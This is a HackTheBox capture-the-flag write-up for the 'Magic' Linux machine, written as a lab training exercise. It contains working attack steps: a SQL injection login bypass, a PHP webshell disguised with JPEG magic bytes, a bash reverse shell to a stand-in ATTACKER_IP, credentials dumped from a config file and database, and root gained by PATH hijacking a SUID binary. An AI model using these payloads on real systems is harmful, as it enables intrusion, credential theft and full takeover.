# Magic — HackTheBox Machine Writeup

## 📌 Overview

- Platform: HackTheBox
- Target: Magic
- OS: Linux
- Difficulty: Medium

---

## 🔍 Enumeration

### Initial Port Scan

I started with a standard service enumeration scan:

nmap -T4 -sV -sC -n -Pn 10.10.X.X

Results showed two open ports:

22/tcp — SSH  
80/tcp — HTTP

Since only SSH and a web service were exposed, the web application became the primary attack surface.

---

## 🌐 Web Enumeration

### Identifying Hostname

Browsing the web service revealed the domain:

magic.htb

I added it locally:

echo "10.10.X.X magic.htb" | sudo tee -a /etc/hosts

---

### Website Analysis

The homepage displayed a gallery of images uploaded by users.

At the bottom of the page, there was a message:

"Please login to upload images."

This indicated that authentication was required to upload files, which could potentially lead to file upload vulnerabilities.

---

### Directory Fuzzing

While exploring the login page, I also performed directory enumeration:

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -u http://magic.htb/FUZZ

No interesting hidden endpoints were discovered.

---

## 🔐 SQL Injection Authentication Bypass

Since login credentials were unknown, I tested for SQL injection.

First attempt:

'

No result.

Next attempt:

' OR 1=1 -- -

This successfully bypassed authentication and logged me into the application.

This confirmed the login form was vulnerable to SQL injection.

---

## ⚔️ File Upload Exploitation

After logging in, the application allowed uploading image files with restrictions:

Allowed extensions:

- JPG
- JPEG
- PNG

To bypass this restriction, I created a PHP webshell disguised as a JPEG file.

---

### Creating Webshell Payload

First, I added valid JPEG magic bytes:

echo -e '\xff\xd8\xff\xe0\x00\x10JFIF' > shell.php.jpg

Then appended PHP code:

echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

---

### Uploading the Webshell

The file was uploaded successfully through the upload panel.

The uploaded file was accessible at:

http://magic.htb/images/uploads/shell.php.jpg

---

### Executing Commands

I tested command execution:

http://magic.htb/images/uploads/shell.php.jpg?cmd=id

However, execution was blocked due to the `.jpg` extension.

---

### Bypassing Extension Restriction

Using Burp Suite:

1. Uploaded a normal image
2. Intercepted the upload request
3. Modified filename from `.jpg` to `.php`
4. Kept JPEG magic bytes to bypass file validation

After forwarding the request, the shell became accessible.

---

## Reverse Shell

I obtained a reverse shell using:

http://magic.htb/images/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'

Listener:

nc -lvnp 4444

This resulted in a shell as:

www-data

---

## 🔎 Post-Exploitation Enumeration

### Finding Credentials

Inside the web root directory:

cd /var/www/Magic
ls -la

A database configuration file was discovered:

db.php5

Viewing the file revealed database credentials:

Username: theseus  
Password: iamkingtheseus

---

## Database Enumeration

Using these credentials:

mysqldump -u theseus -piamkingtheseus Magic

The dump revealed login table data containing:

admin : Th3s3usW4sK1ng

---

## User Access

Using the discovered password:

su theseus

This successfully provided a user shell.

---

## 🚀 Privilege Escalation

### SUID Enumeration

Running LinEnum revealed a custom SUID binary:

-rwsr-x--- 1 root users /bin/sysinfo

The binary was:

- Owned by root
- Executable by users group
- theseus was part of the users group

This indicated a likely privilege escalation path.

---

## PATH Hijacking Exploit

The sysinfo binary called external commands without absolute paths.

I created a malicious fdisk binary:

echo '#!/bin/bash' > /tmp/fdisk
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /tmp/fdisk
chmod +x /tmp/fdisk

Then modified PATH:

export PATH=/tmp:$PATH

Executed sysinfo:

/bin/sysinfo

---

## Root Access

The exploit created a SUID bash binary:

/tmp/bash -p

Running:

whoami

Confirmed root access.

---

## 🎯 Lessons Learned

- SQL injection can lead to authentication bypass
- File upload validation can be bypassed using magic bytes
- Database credentials are often stored in configuration files
- Custom SUID binaries are common privilege escalation vectors
- PATH hijacking is effective when binaries use relative command paths

---

## 🧠 Tools Used

- Nmap
- FFUF
- Burp Suite
- Netcat
- MySQL utilities
- LinEnum
